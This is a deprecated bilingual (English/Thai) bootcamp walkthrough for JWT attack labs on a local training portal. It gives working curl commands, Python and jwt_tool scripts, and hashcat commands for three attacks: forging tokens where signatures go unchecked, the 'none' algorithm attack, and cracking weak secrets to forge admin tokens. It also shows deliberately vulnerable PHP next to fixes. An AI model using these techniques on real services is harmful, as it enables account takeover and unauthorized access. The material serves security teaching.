> **DEPRECATED:** This file uses old paths (`/jwt/`) and localhost URLs.
> Please use `walkthrough-sqli-jwt.md` instead, which has:
> - Updated paths: `/resources/` for SQL, `/account/` for JWT
> - Server URL: http://10.10.61.221
> - Current lab configurations

---

# JWT / Authentication Labs - Complete Walkthrough
# LeaguesOfCode Lab Portal - Cybersecurity Bootcamp #1

> **Target:** LeaguesOfCode Lab Portal - Account Services
> **URL:** http://localhost:8080/jwt/
> **Auth Type:** JWT (JSON Web Token)
> **Difficulty:** Easy → Medium
> **Tools:** Browser, curl, jwt.io, jwt_tool, hashcat, Burp Suite

---

## Lab Overview / ภาพรวม

| Lab | Page | Technique | Difficulty | Time |
|-----|------|-----------|------------|------|
| 0 | Login | Setup & Decode JWT | ⭐ Easy | 10 min |
| 1 | Dashboard | Unverified Signature | ⭐ Easy | 15 min |
| 2 | Refresh | None Algorithm | ⭐ Easy | 15 min |
| 3 | Admin API | Weak Secret + Forge | ⭐⭐ Medium | 25 min |

---

## Pre-requisites / เครื่องมือที่ต้องเตรียม

```bash
# Required Tools
- Web Browser + DevTools (F12)
- curl
- jwt.io (https://jwt.io)
- hashcat
- Burp Suite Community Edition

# Optional but helpful
- jwt_tool (https://github.com/ticarpi/jwt_tool)

# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
```

---

## JWT Structure / โครงสร้าง JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o
|___________________________________|.|______________________________________________|.|_______________________________________________|
            HEADER                                    PAYLOAD                                         SIGNATURE
```

**HEADER** (Base64URL encoded):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**PAYLOAD** (Base64URL encoded):
```json
{
  "user": "john",
  "role": "user",
  "email": "john@leaguesofcode.com",
  "iat": 1709520000,
  "exp": 1709523600
}
```

**SIGNATURE**:
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)
```

> ⚠️ **CRITICAL:** JWT = **Encode** ไม่ใช่ **Encrypt**
> ใครก็ decode ดูได้ - ห้ามใส่ความลับใน payload!

---

## Test Accounts / บัญชีทดสอบ

| Username | Password | Role |
|----------|----------|------|
| john | password123 | user |
| wiener | peter | user |
| admin | admin | administrator |

---

## Lab 0: Login & Decode JWT
### ระดับ: ⭐ Easy | เวลา: 10 นาที
### URL: `/jwt/login.php`

### Objective / วัตถุประสงค์
เรียนรู้การหาและถอดรหัส JWT token

### Step-by-Step Walkthrough

#### Step 1: Login to the System

```
1. ไปที่ http://localhost:8080/jwt/login.php
2. Login ด้วย:
   - Username: john
   - Password: password123
3. กด "Sign In"
4. ระบบ redirect ไปหน้า Dashboard
```

#### Step 2: Find the JWT Token

**Method 1: Browser DevTools**
```
1. กด F12 เปิด DevTools
2. ไปที่ Application tab (Chrome) หรือ Storage tab (Firefox)
3. คลิก Cookies → http://localhost:8080
4. หา cookie ชื่อ "auth_token"
5. Copy ค่า JWT (เริ่มด้วย eyJ...)
```

**Method 2: Network Tab**
```
1. กด F12 → Network tab
2. กด Login อีกครั้ง
3. ดู request ที่ไปยัง login.php
4. ดู Response Headers → Set-Cookie
```

**Example Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6InVzZXIiLCJlbWFpbCI6ImpvaG5AbGVhZ3Vlc29mY29kZS5jb20iLCJzZWNyZXRfbWVzc2FnZSI6IlN0YW5kYXJkIHVzZXIgYWNjb3VudCIsImlhdCI6MTcwOTUyMDAwMCwiZXhwIjoxNzA5NTIzNjAwfQ.SIGNATURE
```

#### Step 3: Decode the Token

**Method 1: jwt.io (Recommended)**
```
1. ไปที่ https://jwt.io
2. Paste token ในช่องด้านซ้าย
3. ดู Decoded ทางขวา
```

**Decoded Result:**
```json
// HEADER
{
  "alg": "HS256",
  "typ": "JWT"
}

// PAYLOAD
{
  "sub": 2,
  "user": "john",
  "role": "user",
  "email": "john@leaguesofcode.com",
  "secret_message": "Standard user account",
  "iat": 1709520000,
  "exp": 1709523600
}
```

**Method 2: Command Line**
```bash
# Decode header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6InVzZXIifQ" | base64 -d
# Output: {"sub":2,"user":"john","role":"user"}
```

**Method 3: Python**
```python
import base64
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.xxx"
parts = token.split('.')

# Add padding and decode
def decode_base64(data):
    padding = 4 - len(data) % 4
    if padding < 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)

header = json.loads(decode_base64(parts[0]))
payload = json.loads(decode_base64(parts[1]))

print("Header:", header)
print("Payload:", payload)
```

#### Step 4: สังเกตข้อมูลใน Payload

```
- sub: 2                    → User ID
- user: "john"              → Username
- role: "user"              → Role (target for attack!)
- email: "..."              → Email
- secret_message: "..."     → ข้อความลับ
- iat: 1709520000           → Issued At (Unix timestamp)
- exp: 1709523600           → Expiration (Unix timestamp)
```

> 💡 **Key Insight:** เราเห็น `role: "user"` - ถ้าเปลี่ยนเป็น `role: "administrator"` จะเป็นอย่างไร?

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] สามารถหา JWT ใน Browser Cookies ได้
- [ ] สามารถ decode JWT ด้วย jwt.io ได้
- [ ] เข้าใจโครงสร้าง JWT (Header.Payload.Signature)
- [ ] เข้าใจว่า JWT เป็น Base64URL Encode (ไม่ใช่ Encrypt)

---

## Lab 1: User Dashboard - Unverified Signature
### ระดับ: ⭐ Easy | เวลา: 15 นาที
### URL: `/jwt/dashboard.php`

### Objective / วัตถุประสงค์
เรียนรู้การโจมตี JWT เมื่อ server ไม่ตรวจสอบ signature

### Background / ความรู้พื้นฐาน

**Vulnerable Server Code:**
```php
// ❌ WRONG - No signature verification!
$parts = explode('.', $token);
$payload = json_decode(base64_decode($parts[1]));
$role = $payload->role;  // Trust directly!
```

**Secure Server Code:**
```php
// ✅ CORRECT - Verify signature first
$decoded = JWT::decode($token, new Key($secret, 'HS256'));
$role = $decoded->role;  // Trust after verification
```

### Step-by-Step Walkthrough

#### Step 1: Login และดู Dashboard ปกติ

```
1. Login ด้วย john / password123
2. ดู Dashboard → แสดง "User Dashboard"
3. เห็นข้อความ "You don't have admin access."
```

#### Step 2: Copy JWT Token

```
1. F12 → Application → Cookies
2. Copy auth_token value
```

**Example:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.originalSignature
```

#### Step 3: Decode และวิเคราะห์

ไปที่ jwt.io และ paste token:

```json
// Header
{"alg":"HS256","typ":"JWT"}

// Payload (Current)
{
  "user": "john",
  "role": "user",        ← เราต้องการเปลี่ยนตรงนี้!
  "email": "john@leaguesofcode.com"
}
```

#### Step 4: แก้ไข Payload

**New Payload:**
```json
{
  "user": "john",
  "role": "administrator",    ← เปลี่ยนเป็น administrator
  "email": "john@leaguesofcode.com"
}
```

#### Step 5: Encode Payload ใหม่

**ใน jwt.io:**
1. แก้ไข payload ทางขวา
2. Copy token ทางซ้าย (แม้จะแสดง "Invalid Signature")

**หรือ Manual:**
```bash
# Encode new payload
echo -n '{"user":"john","role":"administrator","email":"john@leaguesofcode.com"}' | base64 | tr -d '=' | tr '+/' '-_'

# Output: eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiZW1haWwiOiJqb2huQGxlYWd1ZXNvZmNvZGUuY29tIn0
```

#### Step 6: สร้าง Forged Token

```
Format: ORIGINAL_HEADER.NEW_PAYLOAD.FAKE_SIGNATURE

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.fakeSignature123
```

> Note: ใส่ signature อะไรก็ได้ เพราะ server ไม่ตรวจ!

#### Step 7: Replace Cookie

**Method 1: DevTools**
```
1. F12 → Application → Cookies
2. Double-click ค่า auth_token
3. Paste forged token
4. Refresh หน้า (F5)
```

**Method 2: Burp Suite**
```
1. Intercept request to dashboard.php
2. Modify Cookie: auth_token=FORGED_TOKEN
3. Forward request
```

**Method 3: curl**
```bash
curl -H "Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.xxx" \
  http://localhost:8080/jwt/dashboard.php
```

#### Step 8: Verify Success

**เมื่อ Attack สำเร็จจะเห็น:**
```
Admin Panel - User Management System

Welcome, Administrator!

Admin Tools:
• Total Users: 156
• Active Sessions: 23
• Server Status: Online

[Admin Access Granted]
Server Key: MASTER_KEY_2026
```

### Why It Works / ทำไมถึงได้ผล

```
1. Server receives token
2. Server splits: header.payload.signature
3. Server decodes payload (base64)
4. ❌ Server SKIPS signature verification
5. Server reads role = "administrator"
6. Server grants admin access!
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] เข้าใจว่า signature ต้อง verify ทุกครั้ง
- [ ] สามารถ modify payload ได้
- [ ] สามารถ replace cookie ได้
- [ ] เข้าใจว่า signature ที่ผิดก็ยังใช้ได้ถ้า server ไม่ตรวจ

---

## Lab 2: Token Refresh - None Algorithm Attack
### ระดับ: ⭐ Easy | เวลา: 15 นาที
### URL: `/jwt/refresh.php`

### Objective / วัตถุประสงค์
เรียนรู้การโจมตีโดยเปลี่ยน algorithm เป็น "none"

### Background / ความรู้พื้นฐาน

**None Algorithm:**
- JWT spec อนุญาต `alg: "none"` = ไม่มี signature
- Server ที่ implement ไม่ดีจะยอมรับ
- Attacker ลบ signature ออก แล้วส่ง token โดยไม่ต้องรู้ secret

**Vulnerable Code:**
```php
if ($header['alg'] === 'none') {
    // Skip signature verification!
    $valid = true;
}
```

### Step-by-Step Walkthrough

#### Step 1: Get Original Token

```
1. Login ด้วย john / password123
2. Copy JWT จาก cookie
```

**Original Token:**
```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"user":"john","role":"user",...}
```

#### Step 2: Create None Algorithm Header

**New Header:**
```json
{"alg":"none","typ":"JWT"}
```

**Encode:**
```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

#### Step 3: Create New Payload

**New Payload:**
```json
{"user":"john","role":"administrator"}
```

**Encode:**
```bash
echo -n '{"user":"john","role":"administrator"}' | base64 | tr -d '=' | tr '+/' '-_'
# Output: eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0
```

#### Step 4: Create Token (No Signature)

```
Format: HEADER.PAYLOAD.  (มีจุดต่อท้าย แต่ไม่มี signature!)

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.
```

> ⚠️ **สำคัญ:** ต้องมีจุด `.` ต่อท้าย!

#### Step 5: Test the Token

**Using curl:**
```bash
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0."

curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8080/jwt/refresh.php
```

**หรือ Cookie:**
```bash
curl -H "Cookie: auth_token=$TOKEN" \
  http://localhost:8080/jwt/refresh.php
```

#### Step 6: Verify Success

**Response:**
```json
{
  "status": "success",
  "message": "Token valid",
  "user": "john",
  "role": "administrator",
  "admin_data": {
    "server_secret": "MASTER_KEY_2026",
    "db_connection": "mysql://admin:password@localhost/loc_db"
  }
}
```

### Variations to Try

บาง server filter "none" แบบ case-sensitive:
```json
{"alg":"none"}     ← ลองก่อน
{"alg":"None"}     ← ถ้าไม่ได้
{"alg":"NONE"}     ← ลองต่อ
{"alg":"nOnE"}     ← Mixed case
```

### Using jwt_tool (Automated)

```bash
# Automatic none algorithm attack
python3 jwt_tool.py <original_token> -X a

# Output จะแสดง tokens หลายแบบ:
# - alg: none
# - alg: None
# - alg: NONE
# - alg: nOnE
```

### Python Script

```python
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

# Create none algorithm token
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "john", "role": "administrator"}

header_b64 = base64url_encode(json.dumps(header))
payload_b64 = base64url_encode(json.dumps(payload))

# Token with empty signature (trailing dot required!)
forged_token = f"{header_b64}.{payload_b64}."
print(f"Forged Token: {forged_token}")
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] เข้าใจ None Algorithm attack
- [ ] สามารถสร้าง token โดยไม่มี signature ได้
- [ ] เข้าใจว่า server ต้อง whitelist allowed algorithms
- [ ] รู้จัก variations (None, NONE, nOnE)

---

## Lab 3: Admin API - Weak Secret Key
### ระดับ: ⭐⭐ Medium | เวลา: 25 นาที
### URL: `/jwt/api.php`

### Objective / วัตถุประสงค์
เรียนรู้การ crack JWT secret ด้วย hashcat แล้ว forge token ใหม่

### Background / ความรู้พื้นฐาน

**Weak Secret Problem:**
- ถ้า secret = "secret123" (คำง่ายๆ)
- Attacker สามารถ brute-force หาได้
- เมื่อรู้ secret → forge token ได้ตามใจชอบ

**Proper Secret:**
- ควรยาว 256+ bits (32+ bytes)
- สุ่มแบบ cryptographically secure
- เช่น: `openssl rand -base64 32`

### Step-by-Step Walkthrough

---

### Part A: Crack the Secret

#### Step 1: Get JWT Token

```
1. Login ด้วย john / password123
2. Copy JWT จาก cookie
```

**Example Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o
```

#### Step 2: Save Token to File

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o" > jwt.txt
```

#### Step 3: Crack with hashcat

**Basic Command:**
```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Options Explained:**
- `-a 0` = Dictionary attack
- `-m 16500` = JWT mode (HS256/HS384/HS512)
- `jwt.txt` = File containing the token
- `rockyou.txt` = Wordlist file

**If using VM (no GPU):**
```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force
```

#### Step 4: Wait for Result

**Progress Output:**
```
Session..........: hashcat
Status...........: Running
Hash.Type........: JWT (JSON Web Token)
Speed.#1.........:  1234.5 kH/s
Progress.........: 1234567/14344384 (8.61%)
```

**When Found:**
```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.xxx:secret123
                                                ^^^^^^^^^
                                                Found!
```

#### Step 5: Show Cracked Result

```bash
hashcat -m 16500 jwt.txt --show

# Output:
# eyJhbGciOiJIUzI1NiJ9...:secret123
```

> 💡 **Result:** Secret key = `secret123`

---

### Part B: Verify the Secret

#### Step 6: ไป jwt.io ตรวจสอบ

```
1. ไปที่ https://jwt.io
2. Paste original token
3. ในช่อง "VERIFY SIGNATURE" ใส่: secret123
4. ดูว่าแสดง "Signature Verified" ✓
```

---

### Part C: Forge Admin Token

#### Step 7: Create New Payload

**Using jwt.io:**
```
1. แก้ไข Payload:
{
  "user": "john",
  "role": "administrator",
  "email": "john@leaguesofcode.com",
  "iat": 1709520000,
  "exp": 1893456000
}

2. ใส่ secret: secret123
3. ตรวจสอบว่า "Signature Verified" ✓
4. Copy token จากด้านซ้าย
```

**Using Python:**
```python
import jwt

SECRET = "secret123"  # Cracked secret

payload = {
    "user": "john",
    "role": "administrator",
    "email": "john@leaguesofcode.com"
}

forged_token = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"Forged Token: {forged_token}")
```

**Using jwt_tool:**
```bash
# Tamper and sign with known secret
python3 jwt_tool.py <original_token> -I -pc role -pv administrator -S hs256 -p "secret123"
```

#### Step 8: Test Forged Token

```bash
FORGED_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.VALID_SIGNATURE"

curl -H "Authorization: Bearer $FORGED_TOKEN" \
  http://localhost:8080/jwt/api.php
```

#### Step 9: Verify Success

**Response:**
```json
{
  "status": "success",
  "message": "Welcome Administrator! Server Key: MASTER_KEY_2026",
  "admin_data": {
    "total_users": 156,
    "server_secret": "MASTER_KEY_2026",
    "database_key": "db_admin_2026",
    "encryption_key": "AES256_PROD_KEY",
    "api_master_key": "sk_live_master_9x8y7z"
  }
}
```

### hashcat Cheat Sheet

```bash
# ========== JWT CRACKING ==========
# Mode: -m 16500 (JWT)
# Attack: -a 0 (Dictionary)

# Basic dictionary attack
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# With rockyou
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Force (for VM without GPU)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt --force

# Show cracked
hashcat -m 16500 jwt.txt --show

# ========== BRUTE FORCE ==========
# ?l = lowercase, ?u = uppercase, ?d = digit

# 6 lowercase letters
hashcat -a 3 -m 16500 jwt.txt ?l?l?l?l?l?l

# Common pattern: word + 3 digits
hashcat -a 3 -m 16500 jwt.txt secret?d?d?d

# ========== STATUS ==========
# Press 's' during run to see status
# Press 'q' to quit
```

### Common JWT Secrets to Try First

```
secret
password
123456
jwt-secret
your-256-bit-secret
changeme
supersecret
secretkey
private-key
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] สามารถใช้ hashcat crack JWT ได้
- [ ] เข้าใจ hashcat options (-a 0, -m 16500)
- [ ] สามารถ verify secret ด้วย jwt.io ได้
- [ ] สามารถ forge token ด้วย secret ที่รู้ได้
- [ ] เข้าใจว่า weak secret อันตรายมาก

---

## Attack Decision Tree / แผนผังการโจมตี

```
ได้ JWT Token
    │
    ▼
┌─────────────────────────────────────┐
│ 1. Decode ด้วย jwt.io               │
│    - ดู algorithm (alg)             │
│    - ดู payload (role, user)        │
└─────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────┐
│ 2. ลอง Modify Payload ตรงๆ          │
│    - เปลี่ยน role → administrator   │
│    - ใส่ signature มั่วๆ            │
│    - ส่งไป server                   │
└─────────────────────────────────────┘
    │
    ├── สำเร็จ → Lab 1 (Unverified Signature)
    │
    ▼ ไม่สำเร็จ
┌─────────────────────────────────────┐
│ 3. ลอง None Algorithm               │
│    - เปลี่ยน alg เป็น "none"        │
│    - ลบ signature ออก               │
│    - เหลือแค่ header.payload.       │
└─────────────────────────────────────┘
    │
    ├── สำเร็จ → Lab 2 (None Algorithm)
    │
    ▼ ไม่สำเร็จ
┌─────────────────────────────────────┐
│ 4. Crack Secret ด้วย hashcat        │
│    - hashcat -m 16500 jwt.txt dict  │
│    - รอจนเจอ secret                 │
└─────────────────────────────────────┘
    │
    ├── สำเร็จ → Lab 3 (Forge with known secret)
    │
    ▼ ไม่สำเร็จ
┌─────────────────────────────────────┐
│ 5. Advanced Attacks                  │
│    - Algorithm Confusion (RS→HS)    │
│    - JWK/JKU Injection              │
│    - Kid manipulation               │
└─────────────────────────────────────┘
```

---

## Tools Quick Reference

### curl with JWT

```bash
# Send in Authorization header
curl -H "Authorization: Bearer <token>" http://target/api

# Send in Cookie
curl -H "Cookie: auth_token=<token>" http://target/dashboard

# Login and get token
curl -X POST http://target/login \
  -d "username=john&password=password123" \
  -c cookies.txt
```

### jwt_tool

```bash
# Decode
python3 jwt_tool.py <token>

# Scan for vulnerabilities
python3 jwt_tool.py <token> -M at

# None algorithm attack
python3 jwt_tool.py <token> -X a

# Crack secret
python3 jwt_tool.py <token> -C -d wordlist.txt

# Tamper + Sign
python3 jwt_tool.py <token> -T -S hs256 -p "secret123"

# Inject claim + Sign
python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p "secret123"
```

### Decode JWT in Bash

```bash
decode_jwt() {
    echo "=== HEADER ==="
    echo $1 | cut -d'.' -f1 | base64 -d 2>/dev/null
    echo ""
    echo "=== PAYLOAD ==="
    echo $1 | cut -d'.' -f2 | base64 -d 2>/dev/null
    echo ""
}

# Usage
decode_jwt "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.xxx"
```

---

## Summary / สรุป

| Lab | Technique | Success Indicator |
|-----|-----------|-------------------|
| 0 | Decode JWT | See payload in jwt.io |
| 1 | Unverified Signature | "Admin Panel" access |
| 2 | None Algorithm | Admin data in JSON response |
| 3 | Weak Secret | Crack "secret123" → forge admin token |

---

## Prevention / การป้องกัน

```php
// ✅ Always verify signature
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

$decoded = JWT::decode($token, new Key($secret, 'HS256'));

// ✅ Whitelist algorithms
$decoded = JWT::decode($token, new Key($secret, 'HS256'));
// Library rejects if alg doesn't match

// ❌ NEVER do this
$parts = explode('.', $token);
$payload = json_decode(base64_decode($parts[1]));
// No verification!

// ✅ Strong secret (256+ bits)
$secret = bin2hex(random_bytes(32));
// or: openssl rand -base64 32

// ✅ Short-lived tokens
$payload = [
    'user' => $user,
    'iat' => time(),
    'exp' => time() + 3600  // 1 hour only
];

// ✅ Validate all claims
if ($payload->exp < time()) {
    throw new Exception("Token expired");
}
```

---

## Additional Resources

- [jwt.io](https://jwt.io) - JWT Debugger
- [jwt_tool](https://github.com/ticarpi/jwt_tool) - JWT Attack Tool
- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt) - Practice Labs
- [hashcat Wiki](https://hashcat.net/wiki/) - Cracking Reference

---

> **Disclaimer**: This walkthrough is for educational purposes only. Only test on systems you own or have explicit permission to test.
